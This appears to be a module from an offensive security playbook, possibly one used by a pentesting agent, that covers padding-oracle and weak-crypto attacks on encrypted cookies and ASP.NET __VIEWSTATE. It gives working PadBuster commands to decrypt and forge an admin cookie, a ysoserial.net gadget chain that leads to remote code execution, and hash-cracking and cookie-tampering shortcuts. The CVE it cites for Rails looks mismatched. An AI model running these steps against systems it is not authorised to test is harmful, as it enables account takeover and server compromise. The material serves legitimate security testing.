# Moraa — Padding oracle & crypto misuse (decrypt/forge cookies without the key)

> Load when an app encrypts session/state/settings into a cookie, hidden field, or URL param to make
> it tamper-proof (opaque base64/hex blob, `__VIEWSTATE`, home-grown CBC cookie). When the decryption
> path leaks whether padding is valid, an attacker with NO key can decrypt AND forge arbitrary
> plaintexts. Cross-ref [[jwt]] (non-JWT encrypted-blob cousin), [[deserialization]] (ViewState→RCE
> lands here, not there).

## Identify padding-oracle candidates
| Signal | What it means |
|---|---|
| Cookie/token is base64 or hex, decoded length is a multiple of 8 or 16 | CBC-mode candidate |
| `__VIEWSTATE` hidden field | ASP.NET — classic padding-oracle / ViewState-forgery target |
| Rails ≤4.0 `_app_session` cookie not signed-then-encrypted | Padding-oracle candidate (CVE-2013-0156 lineage) |
| Java `JSESSIONID` longer than usual (>64 chars base64) | Some app servers encrypt session — test for oracle |
| Custom `auth=...`/`state=...`/`data=...` opaque blob | Always worth a probe |

## Triangulation test (1-byte flip — do this before reaching for a tool)
Flip the last byte of the ciphertext, replay, read the signal:
```
500 Internal Server Error                          = STRONG signal — app leaks padding error directly
401/403 + different body length than normal "wrong" = Possible — diff-based oracle
200 + same body                                     = Not exploitable this way (or timing-only, slow)
```
Mechanics (one paragraph): CBC decrypts `plaintext_block_n = decrypt(ciphertext_block_n) XOR
ciphertext_block_{n-1}`. Mutating `block_{n-1}` one byte at a time and watching whether padding
validates on `block_n` recovers `decrypt(block_n)` byte-by-byte (~256 tries/byte, 16 bytes/block).
The same primitive lets you **forge** any plaintext once you have the per-block mapping.

## PadBuster — decrypt and forge
```bash
gem install padbuster   # or: git clone https://github.com/AonCyberLabs/PadBuster

# DECRYPT — recover plaintext of a cookie
padbuster https://target.com/page CIPHERTEXT 16 --cookies "auth=CIPHERTEXT" --encoding 0
# 0=base64, 1=lower hex, 2=upper hex, 3=base64+url-safe

# ENCRYPT — forge ciphertext for a chosen plaintext
padbuster https://target.com/page CIPHERTEXT 16 --cookies "auth=CIPHERTEXT" \
  --plaintext "user=admin&role=root"
```
Noisy-oracle switches: `-error "Internal Server Error"` (explicit bad-padding signature string),
`--prefix "known_block"` (anchor against a known leading plaintext block), `--no-iv` (when the IV
ships as part of the cookie).

## ASP.NET `__VIEWSTATE` → ysoserial.net → RCE (CVE-2010-3332 lineage, the crown-jewel chain)
If `__VIEWSTATE` decryption is CBC and leaks padding errors:
```
1. Capture __VIEWSTATE from any page (form hidden field / view-source).
2. Run PadBuster against the postback-processing page → recover the decryption oracle.
3. Build a gadget payload with ysoserial.net:
     ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell ..." \
       --decrypt KEY --validationkey KEY --validationalg HMACSHA256 --decryptionalg AES
4. Submit the forged __VIEWSTATE in a POST → RCE under the app-pool identity.
```
**Cheaper variant** when `machineKey` leaks elsewhere (web.config exposure via path traversal,
`/elmah.axd`, `/trace.axd`, `.git/` exposure — see `error-disclosure` patterns): skip PadBuster
entirely, jump straight to ysoserial.net with the recovered key.

## Weak-crypto quick wins (no padding oracle needed)
```
ECB mode detection
  Encrypt/observe a repeated 32-byte plaintext (two 16-byte blocks of the same value).
  Identical ciphertext blocks = ECB confirmed → block-swap / replay attacks viable.

Weak password hash
  hashid <hash>  →  identify algorithm (MD5/SHA1/bcrypt/...)
  MD5/SHA1 unsalted + a leaked user table → crackstation.net / hashcat -m 0 / -m 100

"Base64 as encryption"
  Cookie decodes via base64 to readable JSON/key=value = no real encryption.
  Modify the plaintext, re-encode, submit → privilege change with zero cryptanalysis.

Static IV / reused nonce (CBC or GCM)
  Two ciphertexts of equal length with byte-identical LEADING blocks → likely static IV.
  Enables known-plaintext attacks and first-block bit-flipping.
```

## Chains / severity
| Finding | Severity |
|---|---|
| Padding oracle on session cookie → decrypt → forge admin cookie | Critical (ATO) |
| ViewState padding oracle → ysoserial.net gadget → RCE | Critical |
| Padding oracle on opaque state param → tampered state survives integrity check | Medium/High |
| ECB block-swap on encrypted cookie → role escalation | High |
| Weak hash + small user-table leak → password recovery | High |
| "Base64 as encryption" → tamper plaintext → privilege change | High |
| Oracle confirmed, no forge path applicable (read-only data) | Medium (info disclosure) |
| Only a timing differential, no status/length diff | Low/Info — chain only |

## Method
Spot the CBC-shaped blob → 1-byte-flip triangulation → if `500`/diff-signal, run PadBuster
decrypt then forge → if it's `__VIEWSTATE`, escalate straight to ysoserial.net → prove with a
real forged-cookie request that the app accepts (not just "decryption succeeded"). →
`validate.md` → `findings/`.
